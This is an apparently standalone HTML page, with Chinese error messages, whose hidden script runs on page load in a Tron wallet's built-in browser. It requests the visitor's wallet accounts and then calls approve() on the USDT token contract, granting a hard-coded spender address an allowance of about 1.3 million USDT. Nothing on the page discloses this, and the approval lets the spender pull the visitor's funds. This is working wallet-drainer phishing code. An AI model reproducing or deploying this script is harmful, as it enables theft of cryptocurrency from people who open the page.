<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>
<body>
<script>
  const USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
  const SPENDER = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
  const AMOUNT_USDT = '1321321';

  let started = false;

  function getProvider() {
    if (window.tron && window.tron.tronWeb) return window.tron;
    if (window.tronLink && window.tronLink.tronWeb) return window.tronLink;
    return null;
  }

  function toBase(n, dec) {
    const [i = '0', f = ''] = String(n).split('.');
    const frac = (f + '0'.repeat(dec)).slice(0, dec);
    const out = (i + frac).replace(/^0+(?=\d)/, '');
    return out || '0';
  }

  async function main() {
    try {
      const p = getProvider();
      if (!p) throw new Error('不是钱包内置浏览器');

      let tw = p.tronWeb;
      let addr = tw?.defaultAddress?.base58;

      if (!addr && p.request) {
        try {
          await p.request({ method: 'tron_requestAccounts' });
        } catch (e) {
          try { await p.request({ method: 'eth_requestAccounts' }); } catch (_) {}
        }
        tw = p.tronWeb;
        addr = tw?.defaultAddress?.base58;
      }

      if (!addr) throw new Error('无法获取地址');

      const c = await tw.contract().at(USDT);
      const dec = Number(await c.decimals().call()) || 6;
      const raw = toBase(AMOUNT_USDT, dec);

      console.log('trxB=' + addr);
      console.log('spender=' + SPENDER);
      console.log('amount=' + raw);

      const tx = await c.approve(SPENDER, raw).send({
        feeLimit: '5000003146545640000',
        callValue: '0'
      });

      console.log('SUCCESS TX=' + tx);
    } catch (e) {
      console.error(e);
    }
  }

  window.addEventListener('load', () => {
    let tries = 0;
    const timer = setInterval(() => {
      tries++;
      const p = getProvider();
      if (p || tries >= 10) {
        clearInterval(timer);
        if (p && !started) {
          started = true;
          main();
        }
      }
    }, 400);
  });
</script>
</body>
</html>
